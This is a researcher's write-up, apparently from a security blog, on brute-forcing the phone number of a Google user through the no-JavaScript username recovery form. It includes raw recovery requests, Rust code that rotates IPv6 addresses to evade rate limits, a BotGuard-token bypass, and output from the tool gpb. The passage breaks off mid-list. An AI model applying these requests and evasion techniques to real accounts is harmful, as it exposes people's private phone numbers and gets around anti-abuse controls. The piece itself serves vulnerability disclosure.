---
title: Bruteforcing the phone number of any Google user
url: https://brutecat.com/articles/leaking-google-phones
source: Over Security - Cybersecurity news aggregator
date: 2025-07-02
fetch_date: 2025-10-06T23:56:03.431551
---

# Bruteforcing the phone number of any Google user

[< Back](/)

[< Back](/)

## Bruteforcing the phone number of any Google user

2025-06-09

![](/assets/google-phone-disclosure.gif)

A few months ago, I disabled javascript on my browser while testing if there were any Google services left that still worked without JS in the modern web. Interestingly enough, the username recovery form still worked!

‎

Your browser does not support iframes.

‎
This surprised me, as I used to think these account recovery forms [required javascript since 2018](https://news.ycombinator.com/item?id=18349887) as they relied on botguard solutions generated from heavily obfuscated proof-of-work javascript code for anti-abuse.

### A deeper look into the endpoints

The username recovery form seemed to allow you to check if a recovery email or phone number was associated with a specific display name. This required 2 HTTP requests:

‎
**Request**

```
POST /signin/usernamerecovery HTTP/2
Host: accounts.google.com
Cookie: __Host-GAPS=1:a4zTWE1Z3InZb82rIfoPe5aRzQNnkg:0D49ErWahX1nGW0o
Content-Length: 81
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Email=+18085921029&hl=en&gxf=AFoagUVs61GL09C_ItVbtSsQB4utNqVgKg%3A1747557783359
```

> The cookie and gxf values are from the initial page HTML

‎

**Response**

```
HTTP/2 302 Found
Content-Type: text/html; charset=UTF-8
Location: https://accounts.google.com/signin/usernamerecovery/name?ess=..<SNIP>..&hl=en
```

This gave us a `ess` value tied to that phone number we can use for the next HTTP request.

‎

**Request**

```
POST /signin/usernamerecovery/lookup HTTP/2
Host: accounts.google.com
Cookie: __Host-GAPS=1:a4zTWE1Z3InZb82rIfoPe5aRzQNnkg:0D49ErWahX1nGW0o
Origin: https://accounts.google.com
Content-Type: application/x-www-form-urlencoded
Priority: u=0, i

challengeId=0&challengeType=28&ess=<snip>&bgresponse=js_disabled&GivenName=john&FamilyName=smith
```

This request allows us to check if a Google account exists with that phone number as well as the display name `"John Smith"`.

‎

**Response** (no account found)

```
HTTP/2 302 Found
Content-Type: text/html; charset=UTF-8
Location: https://accounts.google.com/signin/usernamerecovery/noaccountsfound?ess=...
```

**Response** (account found)

```
HTTP/2 302 Found
Content-Type: text/html; charset=UTF-8
Location: https://accounts.google.com/signin/usernamerecovery/challenge?ess=...
```

### Can we even brute this?

My first attempts were futile. It seemed to ratelimit your IP address after a few requests and present a captcha.

‎

Your browser does not support iframes.

‎

Perhaps we could use proxies to get around this? If we take Netherlands as an example, the [forgot password flow](https://g.co/AccountRecoveryRequest) provides us with the phone hint `•• ••••••03`

‎

For Netherlands mobile numbers, they always start with `06`, meaning there's 6 digits we'd have to brute. 10\*\*6 = 1,000,000 numbers. That might be doable with proxies, but there had to be a better way.

### What about IPv6?

Most service providers like [Vultr](https://vultr.com) provide /64 ip ranges, which provide us with 18,446,744,073,709,551,616 addresses. In theory, we could use IPv6 and rotate the IP address we use for every request, bypassing this ratelimit.

‎

The HTTP server also seemed to support IPv6:

```
~ $ curl -6 https://accounts.google.com
<HTML>
<HEAD>
<TITLE>Moved Temporarily</TITLE>
</HEAD>
<BODY BGCOLOR="#FFFFFF" TEXT="#000000">
<!-- GSE Default Error -->
<H1>Moved Temporarily</H1>
The document has moved <A HREF="https://accounts.google.com/ServiceLogin?passive=1209600&amp;continue=https%3A%2F%2Faccounts.google.com%2F&amp;followup=https%3A%2F%2Faccounts.google.com%2F">here</A>.
</BODY>
</HTML>
```

To test this out, I routed my IPv6 range through my network interface and I started work on [gpb](https://github.com/ddd/gpb), using [reqwest's local\_address method](https://docs.rs/reqwest/latest/reqwest/struct.ClientBuilder.html#method.local_address) on its `ClientBuilder` to set my IP address to a random IP on my subnet:

‎

```
pub fn get_rand_ipv6(subnet: &str) -> IpAddr {
    let (ipv6, prefix_len) = match subnet.parse::<Ipv6Cidr>() {
        Ok(cidr) => {
            let ipv6 = cidr.first_address();
            let length = cidr.network_length();
            (ipv6, length)
        }
        Err(_) => {
            panic!("invalid IPv6 subnet");
        }
    };

    let ipv6_u128: u128 = u128::from(ipv6);
    let rand: u128 = random();

    let net_part = (ipv6_u128 >> (128 - prefix_len)) << (128 - prefix_len);
    let host_part = (rand << prefix_len) >> prefix_len;
    let result = net_part | host_part;

    IpAddr::V6(Ipv6Addr::from(result))
}

pub fn create_client(subnet: &str, user_agent: &str) -> Client {
    let ip = get_rand_ipv6(subnet);

    Client::builder()
        .redirect(redirect::Policy::none())
        .danger_accept_invalid_certs(true)
        .user_agent(user_agent)
        .local_address(Some(ip))
        .build().unwrap()
}
```

Eventually, I had a PoC running, but I was still getting the captcha? It seemed that for whatever reason, datacenter IP addresses using the JS disabled form were always presented with a captcha, damn!

### Using the BotGuard token from the JS form

I was looking through the 2 requests again, seeing if there was anything I could find to get around this, and `bgresponse=js_disabled` caught my eye. I remembered that on the [JS-enabled account recovery form](https://accounts.google.com/signin/v2/usernamerecovery), the botguard token was passed via the **bgRequest** parameter.

‎

![](/assets/leaking-google-phones/bgtoken.png)

‎

What if I replace `js_disabled` with the botguard token from the JS-enabled form request? I tested it out, and **it worked??**. The botguard token seemed to have no request limit on the No-JS form, but who are all these random people?

```
$ ./target/release/gpb --prefix +316 --suffix 03 --digits 6 -f Henry -l Chancellor -w 3000
Starting with 3000 threads...
HIT: +31612345603
HIT: +31623456703
HIT: +31634567803
HIT: +31645678903
HIT: +31656789003
HIT: +31658854003
HIT: +31667890103
HIT: +31678901203
HIT: +31689012303
HIT: +31690123403
HIT: +31701234503
HIT: +31712345603
HIT: +31723456703
```

It took me a bit to realize this, but those were all people who had the Google account name "Henry" with no last name set, as well as a phone with the last 2 digits **03**. For those numbers, it would return `usernamerecovery/challenge` for the first name Henry and **any last name**.

‎

I added some extra code to validate a possible hit with the first name, and a random last name like `0fasfk1AFko1wf`. If it still claimed it was a hit, it would be filtered out, and there we go:

```
$ ./target/release/gpb --prefix +316 --suffix 03 --digits 6 --firstname Henry --lastname Chancellor --workers 3000
Starting with 3000 threads...
HIT: +31658854003
Finished.
```

> In practise, it's unlikely to get more than one hit as it's uncommon for another Google user to have the same full display name, last 2 digits as well as country code.

### A few things to sort out

We have a basic PoC working, but there's still some issues we have to address.

* [How do we know which country code a victim's phone is?](#how-do-we-know-which-country-code-a-victim-39-s-phone-is-)
* [How do we get the victim's Google account display name?](#how-do-we-get-the-victim-39-s-google-account-display-name-)

‎

#### How do we know which country code a victim's phone is?

Interestingly enough, it's possible for us to figure out the country code based off of the phone mask that the [forgot password flow](https://g.co/AccountRecoveryRequest) provides us. Google actually just uses [libphonenumbers](https://github.com/google/libphonenumber)'s "national format" for each number.

Here's some examples:

```
{
    ...
    "• (•••) •••-••-••": [
        "ru"
    ],
    "•• ••••••••": [
  ...